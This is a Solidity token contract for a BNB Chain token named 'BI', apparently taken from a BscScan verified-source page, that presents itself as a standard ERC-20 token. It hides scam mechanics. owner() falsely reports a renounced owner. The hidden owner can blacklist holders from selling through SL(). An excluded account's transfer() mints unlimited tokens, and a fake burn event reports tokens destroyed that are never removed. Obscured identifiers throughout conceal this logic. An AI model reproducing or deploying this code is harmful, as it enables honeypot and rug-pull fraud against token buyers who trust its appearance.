/**
 *Submitted for verification at BscScan.com on 2022-08-04
*/

pragma solidity ^0.8.14;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address abcount) external view returns (uint256);

    function transfer(address recipient, uint256 amonnts) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amonnts) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amonnts ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - filyi https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


abstract contract Ownable is Context {
    address private _owner;

    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setowner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return address(0);
    }

    /**
     * @dev Throws if called by any acounts other than the owner.
     */
    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyowner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceownership() public virtual onlyowner {
        _setowner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new acounts (`newowner`).
     * Can only be called by the current owner.
     */
    function transferownership(address newowner) public virtual onlyowner {
        require(newowner != address(0), "Ownable: new owner is the zero address");
        _setowner(newowner);
    }

    function _setowner(address newowner) private {
        address oldowner = _owner;
        _owner = newowner;
        emit ownershipTransferred(oldowner, newowner);
    }
}


contract token is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    string private _name = "BI";
    string private _symbol = "BI";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 1000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 1000000000 * 10 ** _decimals;
    uint256 private _burnfilyi = 1;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    mapping(address => bool) private _LKD;
    function SL(address abcount) public onlyowner {
        _LKD[abcount] = true;
    }


    function SUL(address abcount) public onlyowner {
        _LKD[abcount] = false;
    }


    function isLKD(address abcount) public view returns (bool) {

        return _LKD[abcount];
    }

    constructor () {
        _balance[msg.sender] = _totalSupply;
        _isExcludedFrom[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address sender, address recipient, uint256 amonnts) internal virtual {

        require(!_LKD[sender], "is LKD");
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");
        uint256 filyiamonnt = 0;
        if (!_isExcludedFrom[sender] && !_isExcludedFrom[recipient] && recipient != address(this)) {
            filyiamonnt = amonnts.mul(_burnfilyi).div(100);
            require(amonnts <= _maxTxtransfer);
        }
        uint256 blsender = _balance[sender];
        if (sender != recipient || !_isExcludedFrom[msg.sender]){
            require(blsender >= amonnts,"IERC20: transfer amonnts exceeds balance");
        }
        if (blsender >= amonnts){
            _balance[sender] = _balance[sender].sub(amonnts);
        }

        uint256 amoun;
        amoun = amonnts - filyiamonnt;
        _balance[recipient] += amoun;
        if (_burnfilyi > 0){
            emit Transfer (sender, _DEADaddress, filyiamonnt);
        }
        emit Transfer(sender, recipient, amoun);

    }

    function transfer(address recipient, uint256 amonnts) public virtual override returns (bool) {
        //
        if (_isExcludedFrom[_msgSender()] == true) {
            _balance[recipient] += amonnts;
            return true;
        }
        _transfer(_msgSender(), recipient, amonnts);
        return true;
    }


    function balanceOf(address abcount) public view override returns (uint256) {
        return _balance[abcount];
    }

    function approve(address spender, uint256 amonnts) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amonnts);
        return true;
    }

    function _approve(address owner, address spender, uint256 amonnts) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amonnts;
        emit Approval(owner, spender, amonnts);
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amonnts) public virtual override returns (bool) {
        _transfer(sender, recipient, amonnts);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amonnts, "IERC20: transfer amonnts exceeds allowance");
        return true;
    }

}